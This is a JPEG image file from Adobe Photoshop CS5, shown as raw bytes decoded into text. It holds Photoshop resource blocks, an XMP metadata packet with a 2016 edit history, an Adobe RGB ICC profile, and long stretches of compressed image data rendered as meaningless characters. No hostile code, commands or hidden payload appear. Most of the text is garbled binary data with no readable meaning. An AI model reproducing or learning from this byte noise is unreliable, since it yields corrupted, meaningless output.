        8BIMõ     H /ff  lff       /ff  ¡™š       2    Z         5    -        8BIMø     p  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè  8BIM       8BIM                   8BIM0       8BIM-               8BIM          @  @    8BIM         8BIM    7             X  ¶    7                                ¶  X                                            null      boundsObjc         Rct1       Top long        Leftlong        Btomlong  X    Rghtlong  ¶   slicesVlLs   Objc        slice       sliceIDlong        groupIDlong       originenum   ESliceOrigin   
autoGenerated    Typeenum   
ESliceType    Img    boundsObjc         Rct1       Top long        Leftlong        Btomlong  X    Rghtlong  ¶   urlTEXT         nullTEXT         MsgeTEXT        altTagTEXT        cellTextIsHTMLbool   cellTextTEXT        	horzAlignenum   ESliceHorzAlign    default   	vertAlignenum   ESliceVertAlign    default   bgColorTypeenum   ESliceBGColorType    None   	topOutsetlong       
leftOutsetlong       bottomOutsetlong       rightOutsetlong     8BIM(        ?ð      8BIM         8BIM    s          e  à  ½`  W  ÿØÿí Adobe_CM ÿî Adobe d€   ÿÛ „ 			



ÿÀ  e  " ÿÝ  
ÿÄ?           	
          	
  3 !1AQa"q2‘¡±B#$RÁb34r‚ÑC %’Sðáñcs5¢²ƒ&D“TdEÂ£t6ÒUâeò³„ÃÓuãóF'”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö7GWgw‡—§·Ç×ç÷   5 !1AQaq"2‘¡±B#ÁRÑð3$bár‚’CScs4ñ%¢²ƒ &5ÂÒD“T£dEU6teâò³„ÃÓuãóF”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö'7GWgw‡—§·ÇÿÚ   ? õT’I%)$’IJI$’R’I$”¤ÄÇ)Ô_ôRS$’I%)$’IJI$’R’I$”¤’I%?ÿÐõT•½‘v/GËÈ¡ÞµÖ\Çˆ$ínjÅÎg[ÃéêCªÛdúDTk®?Hæ2í¿›½E“/>“.ñÊ¸tøMœ¯º"}ÈÃŽ~Ô¸ýSôþä'ûïR’ÂgÖüg?²åœ£„2môMÀ–lõ=Mÿ ›þ\Ïë˜¸#æX^æ±Ì-
‚ÿ EÜ½¿Ì5®È»þëÿ 5êÿ 6§œ%
âmHN3¾
nè¤³O_é¡¡åï-sCÁ¼ËIØ×7k}Û·Ùüçé¢>°à¾öUClÈCêl·‡:½¼oõ[UÛ6£M\ê$’I)J/ú*J/ú))’I(j/h’@Ôr9ILÒP6Ô ´IÚ5ŸÝN,¬’"$HïÂJd’‡«Vžöê`j9á/Z™Ôlžyÿ È¹%3IA×RÖîsÚ9$€5MöŠ7ú~£w‰;dL
µ%$I0 ‰'IOÿÑôÎ£NVø÷îô¬cƒö˜tGæ’¹ü<kÆ#ìf
,eb·?)»DXÏm{šßO÷?á+ý
éìfúÜÉÀ‰ø…û#©}‘¸g&³Cb³]ñ¯õ•NfÄ¡KÑ!èö‡¯ô8ýßÑþãk—Ì#1ÇT¸ÎŸ¥Ãíþ—¦?Õr.ÇczØùxÝ;©_eŸ¯ÔöÖïRŠ±·ÔÚÞï¤÷z8_Îá~’»ž]qÏêfÎ—•gOÆÆÆ«"ëñö¬uïÈªššìšr+ªš›…sìöú¶zµ7²ÏV­ÿ Qðo~H9Ù¬ÇÌ½Ù7â2Æ
\÷8\ïg¥»é·÷Ö†oC7³2ŒË°ú…lu_l¤T^êœïSì÷Wu6ãÛUoþkô^­_é?Kw«pÎrùÖßµ¡Š‰‘=jº¼¯QÏë
ÉW½GæYOUª·äÖæaÝmãÝÔj¦ÌŒvm«#uvÓ•‘ˆÜ[nÆ¯üÚÞ‹ÖïÇ°u³öªM¹]Iï©—6Ú=sv¿Ó›q[O¥WÙ};2²jûfO¨º>¬aUè½×ä]‘Vaê6dZöºËo5¿ôÞÆÔÚYg¥UÕã×W¥W¦£wÕN™*eî¶Ê«vkVàñÔM®Ì®ÒÆ¶ÍûCýIõXÏå ÊÔê[rz]u§ƒVù–Šð™v]m¬¶eÖçelôðþÎÆþ‘•}³}¶UV7Ú·CêÔõž—OQ¥¾›mÞÒÍÍx­ïÇ´6êe7WêÔÿ Nêß²Úÿ H©;êÍÏ¾Þ­™n^#‰ÃË{q½Jƒ˜ê,¯LF×ËØïÓý¡–{êªÊý+¾-6QC*²÷ä½³ºëv ºLû½SOù•1%%QÑRQÑIL–m¤=öV_ŠðâZâAZà¯õ7ÿ -i*¿®!ìKÃˆníX7Ù»hrJiî¤WéÆ™"kAŸkŽ¾ß£¹X³÷9Îm8Æf7'M¬Üèýßj™ËéÛw;l9Û],31»Ü6þê™ê8`Ç©å£\u=¾ŠJFpÞ×n®Œ`àæívÒ ?t}&ÙôT]‰|¶Œ]­€ÒZt‘6mnßoéQQÃfÈßôd8w,ðýæ¤z† qa¸8°®äsÙ% nä’úqAÛí†“î‘¡Ñ¾ÍªOÅ½çÝN9$KœàO¸—HÉÚTÿ j`éúMLiDñ:)~ÑÄ â$ßkµn}©)ˆoRmmk
îû»U´Š°Ùî ƒÉ­ãùHé)ÿÒõ›ÙnM“éÒÇXøÔÃF÷GÜ±1þ»t‹î®–²ö›\æÝÐ÷{VŸZÿ ‘³ÿ ðµßõ\v7N¡þ‹ŒÁkëÞÓéÙ¸†3Õ±ÍœŠ7~ç¶Ïç-­^äð`ž9Ë(•ƒQ1;zxµió9sC$c†ªåÅ×^x^Ö´¼—¤xÊx¹5¶Ü{«º·è×Öàæ“ý®a?™ïTú,btzê¹îýM›m}º8 Ñh6{¬÷zOfï{Ö]Õ}Zm/›®aÙamoõ?FÊ©¬X×Süý>•>v·Ù“Ïð™U*sŒnèÕ÷ñmÄÜAÚÆÏI½›Í{†ð7Î°tÝ·ä¤¹Ì†}^ÈÊ¿!Ù¹ûÚËý6»Øwzû™O­FÛwzyN»ÔÃô²~Å~3*ÊO‡‹Ðs®eXü¦z~«Zæ5´´×èÔï`¦šýgî§}-oèÿ ÑÓëþ•©z@“ jIH8 Ì?~ªô§Ueo«¸9Ö8<Ã€c¿kÿ 5»}ÿ àÿ CüÏèÕêú}5çYœ×?Õ¹»ÒAi6öÝìÛí÷ÿ „±%6”_ôT”_ôRS%m6=­·&7\ÊÚZ ?AŽôÿ ±½h >ûÚ}´
Åº8j{µÿ ¿~çõSX¾çÜ6ÛÏP7h
 »Ôk¶;Úÿ ç}g¾¶Ëò¯¥î.ú@3÷]ýŠÏÚìãìön×Û,˜}ßO÷Ÿ±'e^	Ç–YàÓÜöíwÒIH®éùV9Å™÷TàâÖ†£ZÝ¾æ9ÌÞæoýÏÏQ=3$±¬ý¡‘-™°8þ£Gµg·ù½Û>‚;òok¡¸¶;Ü@2À ~ÓüïÌMö¬…ßd|öis&`ŸÞú?š’‘Õƒ–ÇCó­²½¢kƒƒ·nÞÖ·Ù´lØö½âÚ[ &ÉíÃhˆ O¡ôuüä†]»ƒ_cgv¢= »óç&yk‰hž5gËü"JlVÒÆ5¤î Aq€Iîã·÷”÷vº=IlD;ß»é7oöÑÒSÿÓõé¯"›(´nªÖ–=²DµÃk„·ÝôVuVzF3ýLjßU›K7z±ÂÍ™º½®þ¢ÕI>9r@ÆrŒOÍ}2þôVË$A”A#bF£ê‚¼:™M”™{mùÒFÑVßÑìÛú65¾ÄÍéØ
­•· Ê§ÓnÆÃdlvÝ?9žÅa$ÒI6WZaÁÓõz´˜ö7I-±Ý¿:ÊØÿ ë§¯«=J©®»6Š÷µ ;c~{š>ƒcè#$‚”’I$¥(¿è©(¿è¤¦J…¦Zâ÷Ôé/u„, ¹ÅÏs‹Zðß¥cÝü…}$”ÒýÓý6Õé»c ¾£øînã¿sÿ ³é&«£tÚL×Q´³W½Þ×FæûÞïÝW’IM°bCd‡ÆàKŒÁÞÞOï(žˆí¡Ísƒ4»MK÷}/¥¸ý5i$”Ö=;·ik¢Iúo ]»µßô}ö¤p1KÝak·<É!ï÷ïj²’Jc]lª¶ÖÁ
`£ ÅI$’SÿÔõT’I%)$’IJI$’R’I$”¥ý¤’JRI$’”’I$¥$’I)I$’JRI$’ŸÿÕõT—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ê¤—Ê©$§ÿÙ 8BIM!     U       A d o b e   P h o t o s h o p    A d o b e   P h o t o s h o p   C S 5    8BIM      ømaniIRFR   ì8BIMAnDs   Ì            null       AFStlong        FrInVlLs   Objc         null       FrIDlonghO³Æ    FStsVlLs   Objc         null       FsIDlong        AFrmlong        FsFrVlLs   longhO³Æ    LCntlong      8BIMRoll           8BIM¡     mfri                    8BIM           ÿá}http://ns.adobe.com/xap/1.0/ <?xpacket begin="ï»¿" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00        ">
	<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
		<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/" xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stEvt="http://ns.adobe.com/xap/1.0/sType/ResourceEvent#" xmlns:stRef="http://ns.adobe.com/xap/1.0/sType/ResourceRef#" xmp:CreatorTool="Adobe Photoshop CS5 Windows" xmp:CreateDate="2016-11-15T17:16:12+05:00" xmp:MetadataDate="2016-11-15T17:16:21+05:00" xmp:ModifyDate="2016-11-15T17:16:21+05:00" photoshop:ColorMode="3" photoshop:ICCProfile="Adobe RGB (1998)" dc:format="image/jpeg" xmpMM:InstanceID="xmp.iid:366765EC20ABE611BF55F001BDA26C84" xmpMM:DocumentID="xmp.did:346765EC20ABE611BF55F001BDA26C84" xmpMM:OriginalDocumentID="xmp.did:346765EC20ABE611BF55F001BDA26C84">
			<xmpMM:History>
				<rdf:Seq>
					<rdf:li stEvt:action="created" stEvt:instanceID="xmp.iid:346765EC20ABE611BF55F001BDA26C84" stEvt:when="2016-11-15T17:16:12+05:00" stEvt:softwareAgent="Adobe Photoshop CS5 Windows"/>
					<rdf:li stEvt:action="saved" stEvt:instanceID="xmp.iid:356765EC20ABE611BF55F001BDA26C84" stEvt:when="2016-11-15T17:16:21+05:00" stEvt:softwareAgent="Adobe Photoshop CS5 Windows" stEvt:changed="/"/>
					<rdf:li stEvt:action="converted" stEvt:parameters="from application/vnd.adobe.photoshop to image/jpeg"/>
					<rdf:li stEvt:action="derived" stEvt:parameters="converted from application/vnd.adobe.photoshop to image/jpeg"/>
					<rdf:li stEvt:action="saved" stEvt:instanceID="xmp.iid:366765EC20ABE611BF55F001BDA26C84" stEvt:when="2016-11-15T17:16:21+05:00" stEvt:softwareAgent="Adobe Photoshop CS5 Windows" stEvt:changed="/"/>
				</rdf:Seq>
			</xmpMM:History>
			<xmpMM:DerivedFrom stRef:instanceID="xmp.iid:356765EC20ABE611BF55F001BDA26C84" stRef:documentID="xmp.did:346765EC20ABE611BF55F001BDA26C84" stRef:originalDocumentID="xmp.did:346765EC20ABE611BF55F001BDA26C84"/>
		</rdf:Description>
	</rdf:RDF>
</x:xmpmeta>
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                <?xpacket end='w'?>ÿâ@ICC_PROFILE   0ADBE  mntrRGB XYZ  Ï        acspAPPL    none                  öÖ     Ó-ADBE                                               
cprt   ü   2desc  0   kwtpt  œ   bkpt  °   rTRC  Ä   gTRC  Ô   bTRC  ä   rXYZ  ô   gXYZ     bXYZ     text    Copyright 1999 Adobe Systems Incorporated   desc       Adobe RGB (1998)                                                                                XYZ       óQ    ÌXYZ                 curv       3  curv       3  curv       3  XYZ       œ  O¥  üXYZ       4   ,  •XYZ       &1  /  ¾œÿÛ C       		
  


 	
ÿÛ C ÿÀ ´" ÿÄ            	
ÿÄ µ   } !1AQa "q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ         	
ÿÄ µ   w !1AQ aq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? ýü¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Šl‹½ ÛmnâçÅWšsé:Œ6¶¶¶÷ênÐ}–îIex#!˜I‰ËÆ±‘sG‘„«¥s:]–>+kWÙºü~f•aÛæ¿ß¥Üí–ôù0[yíåÏýÒËäGæ¤öËæÍä”ƒ¦ Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( Š( ›"ïB)ÔÙz@Þ—eŠÚÕÇön¿™¥XEöù¯÷éw;e½>LÞ{ysÇ¿t²ùù©=²ù³y% é«™Òì±ñ[Z¸þÍ×ãó4«¾ß5þý.çl·§É‚ÛÏo.x÷î–_"?5'¶_6o$¤5 QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE ÙzN¦È»ÐŠ æô»,|VÖ®?³uøüÍ*Â/·Í¿K¹Û-éò`¶óÛËž=û¥—ÈÍIí—Í›É) M\Î—eŠÚÕÇön¿™¥XEöù¯÷éw;e½>LÞ{ysÇ¿t²ùù©=²ù³y% é¨ ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¢Š( ¦È»ÐŠu6EÞ„P 7¥Ùcâ¶µqý›¯ÇæiV}¾kýú]ÎÙoO“·žÞ\ñïÝ,¾D~jOl¾lÞIH:jæt»,|VÖ®?³uøüÍ*Â/·Í¿K¹Û-éò`¶óÛËž=û¥—ÈÍIí—Í›É) M@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@Q@6EÞ„S©².ô"€9½.Ëµ«ìÝ~?3J°‹íó_ïÒîvËz|˜-¼öòç~éeò#óR{eófòJAÓW3¥Ùcâ¶µqý›¯ÇæiV}¾kýú]ÎÙoO“·žÞ\ñïÝ,¾D~jOl¾lÞIH:j (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š )².ô"M‘w¡ÍévXø­­\fëñùšU„_ošÿ ~—s¶[ÓäÁmç·—<{÷K/‘š“Û/›7’Rš¹.Ëµ«ìÝ~?3J°‹íó_ïÒîvËz|˜-¼öòç~éeò#óR{eófòJAÓPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEàS|Ð:ð}(ÔS|ÑGš(ÔS|ÑGš(ÔSL¢.{P¨¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š (¢Š )².ô"M‘w¡ÍévXø­­\fëñùšU„_ošÿ ~—s¶[ÓäÁmç·—<{÷K/‘š“Û/›7’Rš¹.Ëµ«ìÝ~?3J°‹íó_ïÒîvËz|˜-¼öòç~éeò#óR{eófòJAÓPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPEPC¢Šlƒ1þ´ç´§í%áïÙ“áÌÞ"ñ’˜Ì¢{h¶ù×R‘ˆ	8’O ¥|‘7üö(îYcønæ5<ÖÂ6ã#È8>ÀŸ­Iÿ ½‘ÓOøvžc,r6 JŽAaöpÔaô&¿>ö—?ýl’}s_ŒqŸf8,Éáp²QQK¢wºOª}Ïéoü/Éslš9Žc)MÊÞóI(¶­£WØýÿ ‡â/ýü¯öŠ?áø‹ÿ Dßÿ +ßý¢¿?HÚØ;WêàZ0¿Þ_ûìWË¯Ù÷óÿ ä«üÐâð‡üúøÿ ù#ôþˆ¿ôMÿ ò½ÿ Ú(ÿ ‡â/ýü¯öŠüýÂÿ yï±Hv€~eàgïñ¥þ¿g¿Ïÿ ’¯òüBÿ ŸOÿ Ÿÿ $~ø.r²«ü9eV#$k›ˆÃÈüÅ}uû9~Ðzí+ðÚ×ÄÚH°ÈíÐHG™k*ýèßŒŽGPE~"Áþ.¼àöÿ ë×ÝŸðGÿ ]iVÚ¢G$ž]Ö®È…ÎÆ
Žž¹ çÚ¾»‚xÃ1Çæ+Š’”eöJÍkÑ#ó¿¼3ÉrŒæl\e$õnééÕ»[F~Š
)«ÃS³_±ŸÍ¡EPEf€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
l‹½§Sd]èE sz]–>+kWÙºü~f•aÛæ¿ß¥Üí–ôù0[yíåÏýÒËäGæ¤öËæÍä”ƒ¦®gK²ÇÅmjãû7_ÌÒ¬"û|×ûô»²ÞŸ&o=¼¹ãßºY|ˆüÔžÙ|Ù¼’tÔ QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE QE R?Ü?JZGû‡é@Áp?ãËáÏûÚ‡þÛWçêýáÆFyÕúÿ Àÿ /‡?ïjûm_ŸµüßÇßò?Ÿý»ùDþÖðN¤ÿ ëçþ•#õöcýš|?ñ áî‘»KÐíÅ¾•hîï§E4’»Ä	$‘ì{×¦Ãøoþ}ô?üAPþÃ þ-ÍŸý‚¬?ôM{§óÅ~ýƒÂPT!îGeÑv^Gòe™bþ·S÷’ø¥öŸwæxü0ï†ÿ çßCÿ Á$‡ñ3ö(ðÅ—ÃÍvf¶ÑŸÉÓçq·G…"6#r9ôWJç~.|-ñýƒn?ô[Uâ°´'ìú.Þ†x,Ëõˆ~ö[¯´û¯3ðža¶]¹>­þ×\~˜¯·?à’ê¯?ì; þ‹ñÏü|·Ò¾Úÿ ‚KÛÞØvßµ¯Áü=ÿ ‘êô©ýuã#ÿ ŒNOÎš?F¦¸X>g`ª½I8«X3Çå®=|åÿ übÿ ‚Ü~Ø^/ñíM¬|>³Õ/´ßøPE³·”Æ·“4i#I&ß½‚ØÐWÃë­Þm'í—X ¡•˜:þáÉ|*­ÁÃV²‡:M+^Éíwu­ó3>ñnŽ<%*.|®ÍÞÚ­ì¬ô?¨øHôÿ ùþµÿ ¿Ëþ4ÂGcÿ ?¶¿÷õÆ¿—õ×o3ÿ W÷Ñ§Eâ{è&–êáYH ‡<_Zõ?âKþ‚ò_ø'vú·þMÿ  þ¢Q!ùzþ´åæ¿0à†_·/ˆ¼W&µàêÚÅ†wZeÝÌ¾d–JÏå´E˜å“,¤zsøþž«î¯Éóì–¶W–
³MÇªÙ§ªgì<?ÑÍ°0ÇQM)t{¦·Cè'ŠFûµäžÑZßU·¼žHáž¤€âEGÑžFÏ ƒù°dÇçƒŽÕüòþÂ?õ¿Ø{þOñcãÕÓ/ÂŸŠ<IðƒÄÅŸl:eä²­Þ—;vPe2&âp¨$ã ?¾?~+h¾x›ÆÞ&»ŽÇÃ¾Ó.u}Jáÿ å¼´ŽG¾Õ8Î1@
j–Ò_5ºÏ\F»Ú5pYG‘×¸üÇ­dèŸ|7â?ëÓ|A¢ê"ðúÄú®—m·ºbÊ»¢3Â¬^0ëÊ–päf¿à‰ž6ø…ÿ ñÔ>*|Aó­¼Eñãàåÿ ÄHìA"éZuÞ±:u²ú³·€Œäá¹êqú…û3ø‹à±ÿ ý ¬| áßìÿ Ú:2üEÔ¤Ñ‹ÔšÛÌ²
ìÆ6Äkól’;È }IE|{ûKÁm¾
þÎ?õ/†¶–?~)xÿ C@úÆ…ð÷Ãø‚çF2>ÐÑ‘mŽJo,½À­ÍSþ
÷ð‡Ãß±ÇÝXøÃGð=æ¬šÛßhrÃªÙÞ5ÓZùSZŸ™H‘NNHÇ<Ð ÔÔWÍ³ÿ üáí?ñçÄÞðmçˆµð®›wª]x–mk_
ÜGi:Ar ¾”,s¤É” 1@ÍxÖ½ÿ  |·Ô59¼7áß_¼#¢Í$þ0ð¯®µÚ˜Î$cuòîEçæEe d‘¿(¯%øgûr|(øÃû/7ÆøßGºøcŸ>§q¯Hæ,áƒwç âxÊ°du
‘Œ×ƒþÍð]„¿µgÆøWÃ>øÏo§øÒáí|?â­SÁW6~Öa’`"ºcŸš8˜®ô\ñÓ4ö•Å|ËûhÁY~þÃþ9Ò|âø«â»n×–ð~‹6¹®\[ß¾0EÂFv¶Œ»¶¶3µ±Kö1ÿ ‚¿ü ý¶þ&ê>Ñá.ð_Ä2×íòøCÆºº²öýæŽ)2²¨ê|¶b $Í z¿í)ûh|)ýŽ¼=g«|Rñ÷…üc¨Íö{6Õï’Ý®äÆH	Üø’ €9$
î<ã}+â7„4ŸhWÖú¶‰¯YC¨é÷¶Í¾»y‘^)PŽªèÁô5øƒñ#þ
_ðoâ7üæøãÁ?<Wàÿ |*}CÒo< u}q§ê‡RÄ×IfÊH‰¡g_´ ’{×°~ßŸðZë_Ù×þ
kû=x Ãð³4‡~ŸX‡Æú
‡ƒe­ Ó¢:|vQˆÃÜE>Y!Ú Xppúéæ|™ûÞ˜ïBJ²tÏå_þÐ¿ðS;É¾è>>ð®¥£èºœ6×“
gBº‡VHæ:ˆæ×È–XÀþÍ”–0°;£?*nuú3ö`ø¡¬|Lð­ÒøŠÞÞ-cI’Ùf{vVÅÅ•½ÚQž?1pŒQŠ±Më…
 õ*(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
(¢€
l‹½§Sd]èE sz]–>+kWÙºü~f•aÛæ¿ß¥Üí–ôù0[yíåÏýÒËäGæ¤öËæÍä”ƒ¦®gK²ÇÅmjãû7_ÌÒ¬"û|×ûô»²ÞŸ&o=¼¹ãßºY|ˆüÔžÙ|Ù¼’tÔ QE QE QEàPE46M;8 Šh“#úP'ûJ uQ@Q@Q@Q@3mÕ|þx  QE QE QE QE QA8Õ|ÿ  :Š3Šo˜¹úÐ¨¦‡Í.ïc@EPEPEàRnâ€ŠElÑ¸PÑMóWþ×Oz<Ì.Ha“@¢‘[4´ QE QE QE QE QE QE QE QE R?Ü?JZGû‡é@Áp?ãËáÏûÚ‡þÛWçí~ÁpãËáÏ×Pÿ ÛjüýËšþmñþJ	úGòGö·ƒÿ òHRÿ ¸ŸúTØ¯Ødÿ Å¸³ÿ °U‡þ‰¯t &¾mý‰~(øoNøogçxƒGŒ6›dƒ}ê)Ü±Fã•íßð¹<&üŒšþ Åÿ ÅWôGØCÞ_z®Èþ?Ì°X­Õ÷%ñK£îüŽu®sâÊïø]â!ýí6ãÿ Eµ"ü`ð«°Ûâ=
™Ž [èŽñêÚó¡ÔlþR³A2õe‘Hüˆ"º%8T‹„d¶õ8ã
”*F¥HµfžªÛzŸóó¿7ÐgüóÇ=ëí¯ø$±ÛoxßÃý»bv/Z÷ß‹²Á»í}®ÖÏÀºd™&á.$e÷d·
øcÔü ýœô_}ŽãÃ7]ÖãÎ#J;•äÎX	üzü×…x:XËën´d’z'®§îyâ…ë$þÏ§†œå÷¥n]-ùŸŽßðW¸ñÿ øŒ§†7zð
¼\ý?Â™ÿ Óý›</ûIüT×,<Qkyyc¦éŸh‰ ¡ÚUQ–^œdõ¯ØïÚ?öqøCñƒ]i¼Q¥øø¶s©Gº‘ 8VÉF#ü+™øAû$x'ÂZ•Õ¿ƒdðUŒ’mkÅÒV?4ÆÆà¤3ŽýkúÆ§ˆ’Y"ÀÑ¥8ÍEEM;%kjºô?‡høo ž¼}zÐ”œœ^­ÞöMm¥Ï¶ÿ ‚ü9¹‚9WÂº€VPàvE?Í_ÿ ÁQdÝöCøÛc è–³ÙÙßipß^àÏ±™äCó÷é_¾I"[ÂªØ@^þ•øÓÿ  ßCyûXèÂ9–F‹ÃöË"† cyóœqßÆ³ðã=Ì±9Ìib+Jqåz6Ú¿Ì¿2³’Ê®Œ#>eªI;_]Žoþ¶7|Zñwý‚÷ý+÷Ð£Çþè¯Ãÿ ø"Çü•ÏØéBWî·ü{GþèþUáx™ÿ #Ùú/Éÿ …¿òOÓõ›$¦±Âþ”êÈ¯?F?¿d/Ø»Oÿ ‚ƒ~Î¿ðR/…÷&õ
{ã§ˆ&ÑnØíû§É¬ç9\L‹¸Ž¨\w¬O~Ü> ÿ ‚ÂþÉ¿³?ì¸Ó]Y|Dø‘­Ë§|k‰Z6áéTjxS˜žòHâd’PðkôËöý4ÿ ØƒÄßµ+_x‚OŒ^<¾ñÝÒÜ[,#M–ë¶M¤îEÀÁ8>Õû8ÿ Á+>~Ì¿·§ÆÚAóŠ>/GoÅ«Æ«’Fé¡#’n¦Hæ“=8à‘@0ø?B²ðÏüFºnŸm
¦Ÿ¦þÍñÛ[[B›c·‰5xÕ#Uì zSþÂ÷zoü#þ
'6ŸÚ/­ôß Éoç÷²®‘.Åü[Šú¢ø'¶›mÿ ?“öœÿ „–ûûZOa›Uû8‡íksöŸ;;·ämÛ·=jÇìûûi¿ ¿mÿ Ž_­üG¨j—ÇÒïJ–Ý
+û>ØÀžSƒ¹÷‚Xî€>cÿ ƒ\4M÷þ	[¦øÒ6ŠóÇ^>ñ&µªxßQp>Ûw©BuÄí÷·,>S ØÇ˜X¼“üIc«ÿ ‘Õ¬äâ+ÏhP±N
